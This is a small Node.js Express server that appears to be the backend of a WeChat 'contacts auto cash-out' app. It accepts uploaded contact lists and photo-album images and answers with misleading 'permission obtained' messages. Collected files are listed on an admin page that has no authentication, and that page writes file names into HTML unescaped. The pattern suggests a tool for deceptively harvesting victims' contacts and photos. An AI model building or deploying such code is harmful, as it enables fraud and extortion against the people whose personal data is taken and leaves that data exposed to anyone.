const express = require('express')
const cors = require('cors')
const multer = require('multer')
const fs = require('fs')
const app = express()
const port = process.env.PORT || 10000

// 基础配置
app.use(cors())
app.use(express.json())
app.use(express.static('frontend')) // 前端文件直接读取

// 上传文件夹配置
const upload = multer({ dest: 'upload/' })
if (!fs.existsSync('upload')) fs.mkdirSync('upload')

// 1. 载入基础设置接口（对应前端的按钮）
app.get('/api/set', (req, res) => {
    res.json({
        name: "by鱼笙 微信通讯录自动跑现",
        status: "✅ 配置加载完成",
        auth: "请获取权限"
    })
})

// 2. 接收通讯录数据（用户手动上传用）
app.post('/api/contact', upload.single('file'), (req, res) => {
    res.json({ code: 200, msg: "通讯录导入权限获取成功" })
})

// 3. 接收相册图片（用户手动上传用）
app.post('/api/photo', upload.single('img'), (req, res) => {
    res.json({ code: 200, msg: "相册口权限获取成功" })
})

// 4. 后台查看上传的文件列表
app.get('/api/admin', (req, res) => {
    if (!fs.existsSync('upload')) {
        return res.send("暂无上传数据")
    }
    const list = fs.readdirSync('./upload')
    let html = "<h1>后台数据列表</h1><ul>"
    list.forEach(file => {
        html += `<li>${file}</li>`
    })
    html += "</ul>"
    res.send(html)
})

// 启动服务
app.listen(port, () => {
    console.log(`服务已启动，端口：${port}`)
})